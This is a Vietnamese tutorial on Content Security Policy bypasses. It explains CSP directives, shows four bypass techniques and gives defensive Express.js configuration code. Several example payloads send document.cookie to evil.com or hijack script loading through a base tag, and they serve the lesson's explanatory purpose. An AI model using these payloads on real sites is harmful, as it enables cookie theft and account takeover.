# Content Security Policy (CSP) Bypass

> **OWASP Top 10:2025**: A02 – Security Misconfiguration | **CWE**: CWE-693 | **Nguồn**: HackTricks, PortSwigger

## 🧱 Kiến thức Nền tảng

**Content Security Policy (CSP)** là cơ chế bảo mật hoạt động qua HTTP response header, cho phép server **kiểm soát nguồn tài nguyên** mà trình duyệt được phép tải và thực thi. CSP được thiết kế là lớp phòng thủ chính chống lại **Cross-Site Scripting (XSS)** — ngay cả khi attacker inject được mã độc vào HTML, trình duyệt sẽ từ chối thực thi nếu vi phạm policy.

Một CSP header được cấu hình đúng:

```http
# Well-configured CSP header
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-r4nd0mN0nc3' https://cdn.trusted.com;
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self' https://api.trusted.com;
  font-src 'self';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

```html
<!-- Browser only executes scripts matching the nonce -->
<script nonce="r4nd0mN0nc3">
    // This script runs because nonce matches CSP header
    console.log("Legitimate script executed");
</script>

<script>
    // This script is BLOCKED — no valid nonce attribute
    alert("XSS attempt");
</script>
```

Mỗi directive trong CSP kiểm soát một loại tài nguyên: `script-src` cho JavaScript, `style-src` cho CSS, `img-src` cho hình ảnh. Directive `default-src` là fallback cho mọi loại tài nguyên không được khai báo riêng. Trình duyệt parse header này và enforce policy cho mọi tài nguyên trên trang.

## 🔍 Mô tả lỗ hổng

CSP Bypass xảy ra khi policy được cấu hình **quá lỏng lẻo** hoặc **thiếu directive quan trọng**, cho phép attacker tìm cách thực thi JavaScript bất chấp CSP đang bật. Đây không phải lỗi của CSP specification mà là **lỗi configuration** — một dạng Security Misconfiguration điển hình.

Những sai lầm phổ biến nhất: sử dụng `unsafe-inline`/`unsafe-eval`, whitelist domain chứa JSONP endpoint, thiếu `base-uri` directive, và whitelist CDN rộng quá mức.

## ⚔️ Cơ chế tấn công

**Bypass 1: `unsafe-inline` — vô hiệu hóa CSP hoàn toàn cho XSS**

```http
# Weak CSP: unsafe-inline allows ANY inline script to execute
Content-Security-Policy: script-src 'self' 'unsafe-inline';
```

```html
<!-- Attacker injects inline script — CSP allows it due to unsafe-inline -->
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Bypass 2: JSONP Endpoint trên whitelisted domain**

```http
# CSP whitelists googleapis.com — but it hosts JSONP endpoints
Content-Security-Policy: script-src 'self' https://*.googleapis.com;
```

```html
<!-- Attacker abuses JSONP callback to execute arbitrary code -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
```

**Bypass 3: Thiếu `base-uri` — hijack relative URLs**

```http
# CSP missing base-uri directive
Content-Security-Policy: script-src 'nonce-abc123';
```

```html
<!-- Attacker injects base tag to redirect all relative URLs -->
<base href="https://evil.com/">
<!-- All relative script paths now load from evil.com -->
<!-- <script src="/app.js"> becomes https://evil.com/app.js -->
```

**Bypass 4: `unsafe-eval` — khai thác eval() chain**

```http
Content-Security-Policy: script-src 'self' 'unsafe-eval';
```

```javascript
// Attacker leverages DOM-based sink that calls eval()
// If application uses: element.innerHTML = userInput
// Attacker crafts input triggering eval chain via existing code
const payload = "fetch('https://evil.com/exfil?d='+document.cookie)";
window.eval(payload);  // Allowed by unsafe-eval
```

## 🛡️ Biện pháp phòng thủ

1. **Loại bỏ `unsafe-inline` và `unsafe-eval`**: sử dụng `nonce-based` hoặc `hash-based` CSP thay thế
2. **Khai báo `base-uri 'self'`**: ngăn chặn `<base>` tag injection
3. **Kiểm tra whitelist domain**: đảm bảo domain được whitelist không chứa JSONP endpoint hoặc open redirect
4. **Sử dụng `strict-dynamic`**: cho phép script được load bởi trusted script mà không cần whitelist domain
5. **CSP reporting**: bật `report-uri` hoặc `report-to` để monitor policy violations

## 💻 Code Example

```javascript
// === VULNERABLE CSP (Express.js) ===
app.use((req, res, next) => {
    // BAD: unsafe-inline + unsafe-eval + wildcard subdomain
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.googleapis.com; " +
        "style-src 'self' 'unsafe-inline'"
    );
    next();
});


// === SECURE CSP (Express.js with nonce) ===
const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate cryptographically random nonce per request
    const nonce = crypto.randomBytes(16).toString('base64');
    res.locals.cspNonce = nonce;

    // GOOD: Strict nonce-based CSP with all critical directives
    res.setHeader('Content-Security-Policy', [
        "default-src 'none'",
        `script-src 'nonce-${nonce}' 'strict-dynamic'`,
        "style-src 'self'",
        "img-src 'self' data:",
        "connect-src 'self'",
        "font-src 'self'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'none'",
        "report-uri /csp-report"
    ].join('; '));
    next();
});

// In EJS/Pug template: <script nonce="<%= cspNonce %>">...</script>
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- HackTricks CSP Bypass: https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- CWE-693: https://cwe.mitre.org/data/definitions/693.html
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
